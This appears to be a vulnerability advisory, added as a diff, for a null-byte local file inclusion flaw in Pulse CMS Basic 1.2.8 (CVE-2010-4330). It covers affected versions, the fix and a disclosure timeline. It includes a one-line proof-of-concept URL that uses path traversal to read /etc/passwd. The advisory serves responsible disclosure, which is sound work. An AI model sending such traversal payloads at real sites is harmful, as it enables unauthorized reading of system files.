@@ -1,0 +1,50 @@
+'Pulse CMS Basic' Local File Inclusion Vulnerability (CVE-2010-4330)
+Mark Stanislav - mark.stanislav@gmail.com
+
+
+I. DESCRIPTION
+---------------------------------------
+A vulnerability exists in the 'includes/controller.php' script that allows for arbitrary local file inclusion due to a null-byte attack.
+
+ 
+II. TESTED VERSION
+---------------------------------------
+Version 1.2.8
+
+
+III. AFFECTED VERSIONS
+---------------------------------------
+< 1.2.9
+
+
+IV. PoC EXPLOIT
+---------------------------------------
+http://www.example.com/index.php?p=/../../../../../../../../../../../../../../etc/passwd%00
+
+
+V. NOTES 
+---------------------------------------
+* magic_quotes_gpc must be disabled for null-byte attacks to work
+* This issue did not affect Pulse CMS Pro according to the vendor
+
+
+VI. SOLUTION
+---------------------------------------
+Upgrade all previously installed versions to 1.2.9
+
+
+VII. REFERENCES
+---------------------------------------
+http://pulsecms.com/
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4330
+http://www.uncompiled.com/2010/12/pulse-cms-basic-local-file-inclusion-vulnerability-cve-2010-4330/
+
+
+VIII. TIMELINE
+---------------------------------------
+11/24/2010: Initial vendor disclosure
+11/25/2010: Vendor response that they had fixed the issue & updated the existing version (1.2.8)
+11/25/2010: Replied to vendor inquiring if a new point release would be made and affected versions
+11/26/2010: Vendor response noting a version increment was coming & vulnerable versions confirmation
+11/26/2010: Pulse CMS Basic 1.2.9 released
+12/05/2010: Public disclosure
